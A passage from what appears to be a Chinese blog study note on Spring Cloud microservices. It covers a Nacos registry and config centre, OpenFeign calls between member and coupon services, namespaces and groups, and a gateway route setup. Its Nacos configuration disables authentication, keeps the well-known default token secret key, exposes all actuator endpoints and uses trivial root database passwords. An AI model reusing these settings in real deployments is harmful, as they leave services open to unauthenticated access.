class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM nacos/nacos-server</span><br><span class="line"># author</span><br><span class="line">MAINTAINER ruoyi</span><br><span class="line"></span><br><span class="line"># 复制conf文件到路径</span><br><span class="line">COPY ./conf/application.properties /home/nacos/conf/application.properties</span><br></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.platform=mysql</span><br><span class="line">db.num=1</span><br><span class="line">db.url.0=jdbc:mysql://ruoyi-mysql:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC</span><br><span class="line">db.user=root</span><br><span class="line">db.password=password</span><br><span class="line"></span><br><span class="line">nacos.naming.empty-service.auto-clean=true</span><br><span class="line">nacos.naming.empty-service.clean.initial-delay-ms=50000</span><br><span class="line">nacos.naming.empty-service.clean.period-time-ms=30000</span><br><span class="line"></span><br><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line"></span><br><span class="line">management.metrics.export.elastic.enabled=false</span><br><span class="line">management.metrics.export.influx.enabled=false</span><br><span class="line"></span><br><span class="line">server.tomcat.accesslog.enabled=true</span><br><span class="line">server.tomcat.accesslog.pattern=%h %l %u %t &quot;%r&quot; %s %b %D %&#123;User-Agent&#125;i %&#123;Request-Source&#125;i</span><br><span class="line"></span><br><span class="line">server.tomcat.basedir=/home/ruoyi/nacos/tomcat/logs</span><br><span class="line"></span><br><span class="line">nacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-ui/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**</span><br><span class="line"></span><br><span class="line">nacos.core.auth.system.type=nacos</span><br><span class="line">nacos.core.auth.enabled=false</span><br><span class="line">nacos.core.auth.default.token.expire.seconds=18000</span><br><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789</span><br><span class="line">nacos.core.auth.caching.enabled=true</span><br><span class="line">nacos.core.auth.enable.userAgentAuthWhite=false</span><br><span class="line">nacos.core.auth.server.identity.key=serverIdentity</span><br><span class="line">nacos.core.auth.server.identity.value=security</span><br><span class="line"></span><br><span class="line">nacos.istio.mcp.server.enabled=false</span><br></pre></td></tr></table></figure><p>上面可以看到，配置nacos是需要MySQL数据库的，数据库中要导入官方指定的sql文件：<code>https://github.com/alibaba/nacos/blob/develop/distribution/conf/mysql-schema.sql</code></p><p>4 使用 @EnableDiscoveryClient 注解开启服务注册与发现功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.yxj.gulimall.coupon;</span><br><span class="line"></span><br><span class="line">import org.mybatis.spring.annotation.MapperScan;</span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">@MapperScan(&quot;com.yxj.gulimall.coupon.dao&quot;)</span><br><span class="line">@EnableDiscoveryClient</span><br><span class="line">public class GulimallCouponApplication &#123;</span><br><span class="line">    public static void main(String[] args) &#123;    </span><br><span class="line">       SpringApplication.run(GulimallCouponApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5 访问<a href="http://127.0.0.1:8848/nacos/">http://127.0.0.1:8848/nacos/</a>  账号密码nacos<br>出现页面，则表示访问成功</p><h3 id="4-3-测试member和coupon的远程调用"><a href="#4-3-测试member和coupon的远程调用" class="headerlink" title="4.3 测试member和coupon的远程调用"></a>4.3 测试member和coupon的远程调用</h3><p>该部分来自于gulimail，服务部署的部分进行了跳过，只需要知道有一个会员服务和一个优惠券服务即可。<br>想要获取当前会员领取到的所有优惠券。先去注册中心找优惠券服务，注册中心调一台优惠券服务器给会员，会员服务器发送请求给这台优惠券服务器，然后对方响应。</p><p>Feign与注册中心<br>spring cloud feign</p><p>声明式远程调用</p><p>feign是一个声明式的HTTP客户端，他的目的就是让远程调用更加简单。<br>给远程服务发的是HTTP请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">1 会员服务想要远程调用优惠券服务，只需要给会员服务里引入</span><br><span class="line">openfeign依赖，他就有了远程调用其他服务的能力。</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">2 在coupon中修改如下的内容</span><br><span class="line">@RequestMapping(&quot;coupon/coupon&quot;)</span><br><span class="line">public class CouponController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private CouponService couponService;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/member/list&quot;)</span><br><span class="line">    public R membercoupons()&#123;    //全系统的所有返回都返回R</span><br><span class="line">        // 应该去数据库查用户对于的优惠券，但这个我们简化了，不去数据库查了，构造了一个优惠券给他返回</span><br><span class="line">        CouponEntity couponEntity = new CouponEntity();</span><br><span class="line">        couponEntity.setCouponName(&quot;满100减10&quot;);//优惠券的名字</span><br><span class="line">        return R.ok().put(&quot;coupons&quot;,Arrays.asList(couponEntity));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3 这样我们准备好了优惠券的调用内容</span><br><span class="line">在member的配置类上加注解@EnableFeignClients(basePackages=&quot;com.yxj.gulimall.member.feign&quot;)，</span><br><span class="line">告诉spring这里面是一个远程调用客户端，member要调用的接口</span><br><span class="line"></span><br><span class="line">package com.yxj.gulimall.member;</span><br><span class="line">import org.mybatis.spring.annotation.MapperScan;</span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line">import org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">@MapperScan(&quot;com.yxj.gulimall.member.dao&quot;)</span><br><span class="line">@EnableDiscoveryClient</span><br><span class="line">@EnableFeignClients(basePackages=&quot;com.yxj.gulimall.member.feign&quot;)</span><br><span class="line">public class GulimallMemberApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(GulimallMemberApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">4 那么要调用什么东西呢？就是我们刚才写的优惠券的功能，</span><br><span class="line">复制函数部分，在member的com.yxj.gulimall.member.feign包下新建类：</span><br><span class="line">package com.yxj.gulimall.member.feign;</span><br><span class="line"></span><br><span class="line">import com.yxj.common.utils.R;</span><br><span class="line">import org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@FeignClient(&quot;gulimall-coupon&quot;) //告诉spring cloud这个接口是一个远程客户端，要调用coupon服务，再去调用coupon服务/coupon/coupon/member/list对应的方法</span><br><span class="line">public interface CouponFeignService &#123;</span><br><span class="line">    @RequestMapping(&quot;/coupon/coupon/member/list&quot;) </span><br><span class="line">    public R membercoupons();//得到一个R对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">5 然后我们在member的控制层写一个测试请求</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;member/member&quot;)</span><br><span class="line">public class MemberController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private MemberService memberService;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    CouponFeignService couponFeignService;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/coupons&quot;)</span><br><span class="line">    public R test()&#123;</span><br><span class="line">        MemberEntity memberEntity = new MemberEntity();</span><br><span class="line">        memberEntity.setNickname(&quot;张三&quot;);</span><br><span class="line">        R membercoupons = couponFeignService.membercoupons(); //假设张三去数据库查了后返回了张三的优惠券信息</span><br><span class="line"></span><br><span class="line">        // 打印会员和优惠券信息</span><br><span class="line">        return R.ok().put(&quot;member&quot;,memberEntity).put(&quot;coupons&quot;,membercoupons.get(&quot;coupons&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">6 重新启动服务</span><br><span class="line">http://localhost:8000/member/member/coupons</span><br><span class="line">&#123;&quot;msg&quot;:&quot;success&quot;,&quot;code&quot;:0,&quot;coupons&quot;:[&#123;&quot;id&quot;:null,&quot;couponType&quot;:null,&quot;couponImg&quot;:null,&quot;couponName&quot;:&quot;满100减10&quot;,&quot;num&quot;:null,&quot;amount&quot;:null,&quot;perLimit&quot;:null,&quot;minPoint&quot;:null,&quot;startTime&quot;:null,&quot;endTime&quot;:null,&quot;useType&quot;:null,&quot;note&quot;:null,&quot;publishCount&quot;:null,&quot;useCount&quot;:null,&quot;receiveCount&quot;:null,&quot;enableStartTime&quot;:null,&quot;enableEndTime&quot;:null,&quot;code&quot;:null,&quot;memberLevel&quot;:null,&quot;publish&quot;:null&#125;],&quot;member&quot;:&#123;&quot;id&quot;:null,&quot;levelId&quot;:null,&quot;username&quot;:null,&quot;password&quot;:null,&quot;nickname&quot;:&quot;张三&quot;,&quot;mobile&quot;:null,&quot;email&quot;:null,&quot;header&quot;:null,&quot;gender&quot;:null,&quot;birth&quot;:null,&quot;city&quot;:null,&quot;job&quot;:null,&quot;sign&quot;:null,&quot;sourceType&quot;:null,&quot;integration&quot;:null,&quot;growth&quot;:null,&quot;status&quot;:null,&quot;createTime&quot;:null&#125;&#125;</span><br><span class="line"></span><br><span class="line">7 coupon里的R.ok()是什么 </span><br><span class="line"># coupon里的控制层就是new了个couponEntity然后放到hashmap（R）里而已。</span><br><span class="line">public class R extends HashMap&lt;String, Object&gt; &#123;</span><br><span class="line">public static R ok() &#123;</span><br><span class="line">return new R();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public R put(String key, Object value) &#123;</span><br><span class="line">super.put(key, value);</span><br><span class="line">return this;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-配置中心"><a href="#4-4-配置中心" class="headerlink" title="4.4 配置中心"></a>4.4 配置中心</h3><p>我们还可以用nacos作为配置中心。配置中心的意思是不在application.properties等文件中配置了，而是放到nacos配置中心公用，这样无需每台机器都改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1 引入配置中心依赖，放到common中</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line"> </span><br><span class="line">2 在coupons项目中创建/src/main/resources/bootstrap.properties ，这个文件是</span><br><span class="line">springboot里规定的，他优先级比application.properties高</span><br><span class="line"># 改名字，对应nacos里的配置文件名</span><br><span class="line">spring.application.name=gulimall-coupon</span><br><span class="line">spring.cloud.nacos.config.server-addr=192.168.11.1:8848</span><br><span class="line"></span><br><span class="line">3 @RestController</span><br><span class="line">@RequestMapping(&quot;coupon/coupon&quot;)</span><br><span class="line">public class CouponController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private CouponService couponService;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;coupon.user.name&#125;&quot;)//从application.properties中获取//不要写user.name，他是环境里的变量</span><br><span class="line">    private String name;</span><br><span class="line">    @Value(&quot;$&#123;coupon.user.age&#125;&quot;)</span><br><span class="line">    private Integer age;</span><br><span class="line">    @RequestMapping(&quot;/test&quot;)</span><br><span class="line">    public R test()&#123;</span><br><span class="line">        return R.ok().put(&quot;name&quot;,name).put(&quot;age&quot;,age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4 浏览器去nacos里的配置列表，点击＋号，data ID：gulimall-coupon.properties，配置</span><br><span class="line"># gulimall-coupon.properties</span><br><span class="line">coupon.user.name=&quot;张三&quot;      </span><br><span class="line">coupon.user.age=12</span><br><span class="line"></span><br><span class="line">5 然后点击发布。重启coupon，http://localhost:7000/coupon/coupon/test</span><br><span class="line">&#123;&quot;msg&quot;:&quot;success&quot;,&quot;code&quot;:0,&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:12&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6 但是修改怎么办？实际生产中不能重启应用。在coupon的控制层上加</span><br><span class="line">@RefreshScope</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7 最终代码如下</span><br><span class="line">@RefreshScope</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;coupon/coupon&quot;)</span><br><span class="line">public class CouponController &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private CouponService couponService;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;coupon.user.name&#125;&quot;)//从application.properties中获取//不要写user.name，他是环境里的变量</span><br><span class="line">    private String name;</span><br><span class="line">    @Value(&quot;$&#123;coupon.user.age&#125;&quot;)</span><br><span class="line">    private Integer age;</span><br><span class="line">    @RequestMapping(&quot;/test&quot;)</span><br><span class="line">    public R test()&#123;</span><br><span class="line">        return R.ok().put(&quot;name&quot;,name).put(&quot;age&quot;,age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">8 重启后，在nacos浏览器里修改配置，修改就可以观察到能动态修改了</span><br><span class="line">nacos的配置内容优先于项目本地的配置内容。</span><br></pre></td></tr></table></figure><h3 id="4-5-配置中心进阶"><a href="#4-5-配置中心进阶" class="headerlink" title="4.5 配置中心进阶"></a>4.5 配置中心进阶</h3><p>在nacos浏览器中还可以配置：</p><p>命名空间：用作配置隔离。（一般每个微服务一个命名空间）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">默认public。默认新增的配置都在public空间下</span><br><span class="line"></span><br><span class="line">开发、测试、开发可以用命名空间分割。properties每个空间有一份。</span><br><span class="line"></span><br><span class="line">在bootstrap.properties里配置</span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.namespace=b176a68a-6800-4648-833b-be10be8bab00  # 可以选择对应的命名空间 ,即写上对应环境的命名空间ID</span><br><span class="line"></span><br><span class="line">也可以为每个微服务配置一个命名空间，微服务互相隔离</span><br></pre></td></tr></table></figure><p>配置集：一组相关或不相关配置项的集合。</p><p>配置集ID：类似于配置文件名，即Data ID</p><p>配置分组：默认所有的配置集都属于DEFAULT_GROUP。自己可以创建分组，比如双十一，618，双十二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">spring.cloud.nacos.config.group=DEFAULT_GROUP  # 更改配置分组</span><br><span class="line">最终方案：每个微服务创建自己的命名空间，然后使用配置分组区分环境（dev/test/prod）</span><br><span class="line"></span><br><span class="line">加载多配置集</span><br><span class="line">我们要把原来application.yml里的内容都分文件抽离出去。我们在nacos里创建好</span><br><span class="line">后，在coupons里指定要导入的配置即可。</span><br><span class="line"></span><br><span class="line">bootstrap.properties</span><br><span class="line">spring.application.name=gulimall-coupon</span><br><span class="line">spring.cloud.nacos.config.server-addr=192.168.11.1:8848</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.namespace=ed042b3b-b7f3-4734-bdcb-0c516cb357d7  # # 可以选择对应的命名空间 ，即写上对应环境的命名空间ID</span><br><span class="line">spring.cloud.nacos.config.group=dev  # 配置文件所在的组</span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.ext-config[0].data-id=datasource.yml</span><br><span class="line">spring.cloud.nacos.config.ext-config[0].group=dev</span><br><span class="line">spring.cloud.nacos.config.ext-config[0].refresh=true</span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.ext-config[1].data-id=mybatis.yml</span><br><span class="line">spring.cloud.nacos.config.ext-config[1].group=dev</span><br><span class="line">spring.cloud.nacos.config.ext-config[1].refresh=true</span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.ext-config[2].data-id=other.yml</span><br><span class="line">spring.cloud.nacos.config.ext-config[2].group=dev</span><br><span class="line">spring.cloud.nacos.config.ext-config[2].refresh=true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">datasource.yml</span><br><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    driver-class-name: com.mysql.cj.jdbc.Driver</span><br><span class="line">    url: jdbc:mysql://192.168.1.103:3306/gulimall_sms?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">    username: root</span><br><span class="line">    password: root</span><br><span class="line"></span><br><span class="line">mybatis.yml</span><br><span class="line">mybatis-plus:</span><br><span class="line">  mapper-locations: classpath:/mapper/**/*.xml</span><br><span class="line">  global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      id-type: auto</span><br><span class="line"></span><br><span class="line">other.yml</span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: gulimall-coupon</span><br><span class="line">  cloud:</span><br><span class="line">    nacos:</span><br><span class="line">      discovery:</span><br><span class="line">        server-addr: 192.168.11.1:8848</span><br><span class="line"></span><br><span class="line">server:</span><br><span class="line">  port: 7000</span><br></pre></td></tr></table></figure><h3 id="4-6-网关"><a href="#4-6-网关" class="headerlink" title="4.6 网关"></a>4.6 网关</h3><p>发送请求需要知道商品服务的地址，如果商品服务器有100服务器，1号掉线后，还得改，所以需要网关动态地管理，他能从注册中心中实时地感知某个服务上线还是下线。</p><p>请求也要加上询问权限，看用户有没有权限访问这个请求，也需要网关。</p><p>所以我们使用spring cloud的gateway组件做网关功能。</p><p>网关是请求浏览的入口，常用功能包括路由转发，权限校验，限流控制等。springcloud gateway取到了zuul网关。</p><p>三大核心概念：</p><p>路由。路由是网关最基础的部分，路由信息有一个ID、一个目的URL、一组断言和一组Filter 组成。如果断言路由为真，则说明请求的URL 和配置匹配<br>断言。Java8 中的断言函数。Spring Cloud Gateway 中的断言函数输入类型是Spring5.0 框架中的ServerWebExchange。Spring Cloud Gateway 中的断言函数允许开发者去定义匹配来自于http request 中的任何信息，比如请求头和参数等。<br>过滤器。一个标准的Spring webFilter。Spring cloud gateway 中的filter 分为两种类型的Filter，分别是Gateway Filter 和Global Filter。过滤器Filter 将会对请求和响应进行修改处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">4.6.1 创建模块gulimall-gateway</span><br><span class="line"></span><br><span class="line">1 在pom.xml引入</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.atguigu.gulimall&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;gulimall-common&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">版本环境需保持一致</span><br><span class="line">&lt;spring-boot.version&gt;2.1.8.RELEASE&lt;/spring-boot.version&gt;</span><br><span class="line">&lt;spring-cloud.version&gt;Greenwich.SR3&lt;/spring-cloud.version&gt;</span><br><span class="line"></span><br><span class="line">2 开启注册服务发现@EnableDiscoveryClient</span><br><span class="line">package com.yxj.gulimall.gateway;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;</span><br><span class="line">import org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication(exclude = &#123;DataSourceAutoConfiguration.class&#125;)</span><br><span class="line">@EnableDiscoveryClient</span><br><span class="line">public class GulimallGatewayApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(GulimallGatewayApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">3 配置nacos注册中心地址applicaion.properties</span><br><span class="line">spring.application.name=gulimall-gateway</span><br><span class="line">spring.cloud.nacos.discovery.server-addr=192.168.11.1:8848</span><br><span class="line">server.port=88</span><br><span class="line"></span><br><span class="line">4 bootstrap.properties 填写配置中心地址</span><br><span class="line">spring.application.name=gulimall-coupon</span><br><span class="line">spring.cloud.nacos.config.server-addr=192.168.11.1:8848</span><br><span class="line"></span><br><span class="line">spring.cloud.nacos.config.namespace=a791fa0e-cef8-47ee-8f07-5ac5a63ea061</span><br><span class="line"></span><br><span class="line">5 nacos里创建命名空间gateway，然后在命名空间里创建文件guilmall-gateway.yml</span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">    application:</span><br><span class="line">        name: gulimall-gateway</span><br><span class="line"></span><br><span class="line">6 在项目里创建application.yml</span><br><span class="line">spring:</span><br><span class="line">cloud:</span><br><span class="line">gateway:</span><br><span class="line">routes:</span><br><span class="line">id: baidu_route</span><br><span class="line">uri: http://www.baidu.com</span><br><span class="line">predicates:</span><br><span class="line">Query=url,baidu</span><br><span class="line"></span><br><span class="line">id: test_route</span><br><span class="line">uri: http://www.qq.com</span><br><span class="line">predicates:</span><br><span class="line">Query=url,qq</span><br><span class="line"></span><br><span class="line">测试 localhost:8080?url=baidu # 跳到百度页面</span><br><span class="line">测试 localhost:8080?url=baidu # 跳到qq页面</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友实习两月记录</title>
